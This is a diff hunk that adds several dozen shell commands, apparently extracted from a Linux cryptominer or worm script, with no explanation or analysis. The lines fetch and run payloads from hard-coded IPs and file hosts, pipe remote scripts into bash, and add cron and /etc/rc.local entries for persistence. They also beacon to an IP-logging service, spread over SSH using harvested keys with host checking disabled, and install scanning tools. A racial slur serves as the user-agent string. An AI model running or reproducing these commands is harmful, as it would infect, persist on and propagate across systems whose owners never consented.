@@ -1,0 +1,48 @@
+curl -sL -o /tmp/kkk http://205.185.113.35/files/lifxvf; chmod +x /tmp/kkk ; /tmp/kkk ; rm -rf /tmp/kkk
+curl -sL -o /var/tmp/bbp/config.json http://205.185.113.35/files/tcazmp.jpg || curl -sL -o /tmp/bbp/config.json http://205.185.113.35/files/tcazmp.jpg;
+curl -sL -o /var/tmp/bbp/config.json https://goload.ru/files/goload_6476_1575522349.jpg || curl -sL -o /tmp/bbp/config.json https://goload.ru/files/goload_6476_1575522349.jpg;
+curl -sL -o /var/tmp/bbp/config.json https://filebin.net/csshic00eqfl625d/new.jpg?t=bpadhjf3 || curl -sL -o /tmp/bbp/config.json https://filebin.net/csshic00eqfl625d/new.jpg?t=bpadhjf3;
+curl -sL -o /var/tmp/bbp/config.json http://uupload.ir/files/na85_new.jpg || curl -sL -o /tmp/bbp/config.json http://uupload.ir/files/na85_new.jpg;
+curl -sL -o /var/tmp/bbp/config.json https://goload.ru/files/goload_4390_1575945720.jpg || curl -sL -o /tmp/bbp/config.json https://goload.ru/files/goload_4390_1575945720.jpg;
+curl -sL -o /var/tmp/bbp/config.json http://205.185.115.72/config.json || curl -sL -o /tmp/bbp/config.json http://205.185.115.72/config.json;
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]} || curl ---create-dirs sL -o /tmp/bbp/bbp $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect3${directarray3[$RANDOM % ${#directarray3[@]}]} || curl ---create-dirs sL -o /tmp/bbp/bbp $urldirect3${directarray3[$RANDOM % ${#directarray3[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect4${directarray4[$RANDOM % ${#directarray4[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect4${directarray4[$RANDOM % ${#directarray4[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect5${directarray5[$RANDOM % ${#directarray5[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect5${directarray5[$RANDOM % ${#directarray5[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect6${directarray6[$RANDOM % ${#directarray6[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect6${directarray6[$RANDOM % ${#directarray6[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect7${directarray7[$RANDOM % ${#directarray7[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect7${directarray7[$RANDOM % ${#directarray7[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect8${directarray8[$RANDOM % ${#directarray8[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect8${directarray8[$RANDOM % ${#directarray8[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect9${directarray9[$RANDOM % ${#directarray9[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect9${directarray9[$RANDOM % ${#directarray9[@]}]};
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape1${scrapearray1[$RANDOM % ${#scrapearray1[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape1${scrapearray1[$RANDOM % ${#scrapearray1[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape2${scrapearray2[$RANDOM % ${#scrapearray2[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape2${scrapearray2[$RANDOM % ${#scrapearray2[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape3${scrapearray3[$RANDOM % ${#scrapearray3[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape3${scrapearray3[$RANDOM % ${#scrapearray3[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape4${scrapearray4[$RANDOM % ${#scrapearray4[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape4${scrapearray4[$RANDOM % ${#scrapearray4[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape5${scrapearray5[$RANDOM % ${#scrapearray5[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape5${scrapearray5[$RANDOM % ${#scrapearray5[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape6${scrapearray6[$RANDOM % ${#scrapearray6[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape6${scrapearray6[$RANDOM % ${#scrapearray6[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape7${scrapearray7[$RANDOM % ${#scrapearray7[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape7${scrapearray7[$RANDOM % ${#scrapearray7[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape8${scrapearray8[$RANDOM % ${#scrapearray8[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape8${scrapearray8[$RANDOM % ${#scrapearray8[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl -A nigger/1.2 -Lo /opt/bbp http://205.185.113.35/files/adnckil
+curl -sL http://205.185.113.35/files/sesa.txt | bash -s 2>/dev/null;
+curl -A nigger/1.2 -4sL https://iplogger.org/109S93 >/dev/null;
+echo "0,30 * * * * curl -sL http://205.185.113.35/files/alduro | bash -s" >> ~/cron || true && \
+echo "0,45 * * * * curl -sL http://205.185.113.35/files/sesa.txt | bash -s" >> ~/cron || true && \
+echo "0 * * * * curl -A cron/1.2 -sL https://iplogger.org/1Sp9r7" >> ~/cron || true && \
+echo "curl -sL http://205.185.113.35/files/alduro | bash ">>/etc/rc.local
+curl -A nigger/1.2 -Lo /opt/bbp/bbp http://205.185.113.35/files/adnckil
+curl -A nigger/1.2 -Lo /opt/bbp/config.json http://205.185.113.35/files/iqmjlf.jpg
+curl -sL https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py  | python - start --port=5710 --log=false;
+myhostip=$(curl -sL icanhazip.com)
+ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "sudo curl -L http://205.185.113.35/files/alduro | sudo bash -s;"
+ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "curl -L http://205.185.113.35/files/alduro | bash -s;"
+curl -L -o /usr/bin/zgrab $(curl -sL $zgrabscrape1${zgrabscrapear1[$RANDOM % ${#zgrabscrapear1[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]};
+curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]};
+scrapeurl=$(curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]}  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+screen -r $rndscreen0 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"3eS7MaDcn6  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
+screen -r $rndscreen1 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"lbS4M5Dbn2  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
+screen -r $rndscreen2 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"J2S1MaDbn9  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
+screen -r $rndscreen3 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"r6SdMfD8n5  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
+screen -r $rndscreen4 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
+screen -r $rndscreen5 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"v6S5M6D4n8  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
+screen -r $rndscreen6 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
